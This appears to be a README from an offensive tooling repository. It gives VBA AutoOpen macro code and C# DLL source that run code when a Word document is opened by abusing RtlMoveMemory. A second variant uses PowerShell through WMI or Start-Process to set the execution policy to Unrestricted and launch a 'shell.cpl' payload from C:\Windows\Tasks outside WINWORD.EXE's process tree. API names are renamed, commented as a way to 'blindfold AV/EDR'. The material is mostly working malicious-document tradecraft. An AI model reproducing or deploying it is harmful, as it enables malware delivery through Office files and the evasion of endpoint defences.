# ExecuteVBAwithRtlMoveMemory
Execute your VBA macro with RtlMoveMemory only
One can replace the ref to API with:

Private Declare PtrSafe Sub Day Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)

VBA NewMacro:
```
Declare PtrSafe Sub DateAdd Lib "C:\Windows\Tasks\MoveMem.dll" (Destination As Any, Source As Any, ByVal Length As LongPtr)

Function Magic() As IUnknown
    MsgBox "Hello ..."
End Function


Sub AutoOpen()
    DateAdd Magic(), &H0, 4
End Sub
```

C# MoveMem.dll contains function RtlMoveMemory:
compile with csc.exe and entrypoint is inserted with .export [1]

```
using System;
using System.Runtime.InteropServices;

namespace Code
{

    public class Program
    {
        public static unsafe void DateAdd(IntPtr Destination, IntPtr Source, byte Length)
        {
            MoveMemory(Destination, Source, Length);
        }

        [DllImport("Kernel32.dll", EntryPoint="RtlMoveMemory", SetLastError=false)]
        static unsafe extern void MoveMemory(IntPtr dest, IntPtr src, byte size);
    }
}
```



Another example, call RtlMoveMemory from VBA and start process with WMI or Start-Process, not a subprocess of WINWORD.EXE

VBA NewMacros:
```
Declare PtrSafe Sub DateAdd Lib "C:\Windows\Tasks\MoveMem.dll" (Destination As Any, Source As Any, ByVal Length As LongPtr)
Declare PtrSafe Sub DateDiff Lib "C:\Windows\Tasks\MoveMem.dll" ()

Function Magic() As IUnknown
    DateDiff
End Function

Sub AutoOpen()
    DateAdd Magic(), &H0, 4
End Sub
```

C# code, compiled with csc.exe and entrypoints created with .export [1] and .export [2]

```
using System;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Code
{
    public class Program
    {
        public static unsafe void DateAdd(IntPtr Destination, IntPtr Source, byte Length)
        {
            AddMinutes(Destination, Source, Length);
        }
				public static unsafe void DateDiff()
        {
//          This examples startes a new process, not a subprocess of WINWORD.EXE
//          WMI example:
  					string ScriptToRun = "Set-ExecutionPolicy Unrestricted -scope Process -force;$pclass=[wmiclass]'root\\cimv2:Win32_Process';$new_pid=$pclass.Create('C:\\Windows\\System32\\rundll32 shell32,Control_RunDLL C:\\Windows\\Tasks\\shell.cpl', '.', $null).ProcessId";
//         Start-Process example:
//				 string ScriptToRun = "Set-ExecutionPolicy Unrestricted -scope Process -force;$cmd=\"C:\\Windows\\system32\\rundll32.exe\";$args=\"shell32,Control_RunDLL C:\\Windows\\Tasks\\shell.cpl\";start-process -PassThru $cmd $args;";
            var runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            var scriptInvoker = new RunspaceInvoke(runspace);
            scriptInvoker.Invoke(ScriptToRun);
            runspace.Close();
            runspace.Dispose();
        }
//      blindfold AV/EDR
				class Monday { public const string day = "RtlMoveMemory"; }
        [DllImport("Kernel32.dll", EntryPoint=Monday.day, SetLastError=false)]
        static unsafe extern void AddMinutes(IntPtr dest, IntPtr src, byte size);
    }
}

```
